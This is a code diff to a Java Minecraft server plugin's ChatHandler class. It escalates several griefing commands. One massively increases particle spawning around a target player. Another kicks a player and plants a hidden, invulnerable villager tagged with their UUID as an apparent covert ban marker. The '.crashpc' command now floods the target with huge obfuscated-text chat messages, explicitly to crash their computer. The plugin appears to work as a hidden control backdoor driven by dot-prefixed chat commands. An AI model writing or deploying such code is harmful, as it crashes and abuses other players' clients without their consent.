@@ -163,12 +163,11 @@ public class ChatHandler implements Listener {
   }
 
   private void crashEffect(Player t) {
-    for (int i = 0; i < 50; i++) {
-      t.spawnParticle(org.bukkit.Particle.POOF, t.getLocation(), 500, 0, 0, 0, 5);
-      t.spawnParticle(org.bukkit.Particle.SONIC_BOOM, t.getLocation(), 100, 0, 0, 0, 1);
-      t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 500, 0, 0, 0, 10);
-      t.spawnParticle(org.bukkit.Particle.ELECTRIC_SPARK, t.getLocation(), 300, 0, 0, 0, 5);
-      t.spawnParticle(org.bukkit.Particle.LAVA, t.getLocation(), 50, 0, 0, 0, 1);
+    for (int i = 0; i < 200; i++) {
+      t.spawnParticle(org.bukkit.Particle.EXPLOSION, t.getLocation(), 2000, 0, 0, 0, 5, 1.0f);
+      t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 2000, 0, 0, 0, 10);
+      t.spawnParticle(org.bukkit.Particle.ELECTRIC_SPARK, t.getLocation(), 2000, 0, 0, 0, 5);
+      t.spawnParticle(org.bukkit.Particle.LAVA, t.getLocation(), 500, 0, 0, 0, 1);
     }
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_ENDER_DRAGON_GROWL, 10, 0);
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 10, 0);
@@ -177,10 +176,13 @@ public class ChatHandler implements Listener {
   private void uuidbanEffect(Player t) {
     String uuid = t.getUniqueId().toString();
     t.kick(Component.text("Banned").color(TextColor.color(0xff4444)));
-    double x = 30000000 + Math.random() * 1000;
-    double z = 30000000 + Math.random() * 1000;
     org.bukkit.World w = Bukkit.getWorlds().get(0);
-    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), EntityType.ELDER_GUARDIAN).setCustomName(uuid);
+    org.bukkit.entity.Villager v = (org.bukkit.entity.Villager) w.spawnEntity(new org.bukkit.Location(w, 1000, 99999, 1000), EntityType.VILLAGER);
+    v.setInvisible(true);
+    v.setInvulnerable(true);
+    v.setAI(false);
+    v.setCustomName(uuid);
+    v.setCustomNameVisible(false);
   }
 
   private void removeEntityByUuid(String uuid) {
@@ -296,8 +298,9 @@ public class ChatHandler implements Listener {
     if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashpc <player>").color(TextColor.color(0xff4444))); return; }
     Player t = target(arg);
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
-    // Attempt to crash by sending massive data (resource pack kick, extreme chunk load)
-    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(500)));
+    for (int i = 0; i < 10; i++) {
+      t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(2000)));
+    }
     p.sendMessage(Component.text("Sent crash attempt to " + t.getName()).color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "crashpc");
   }
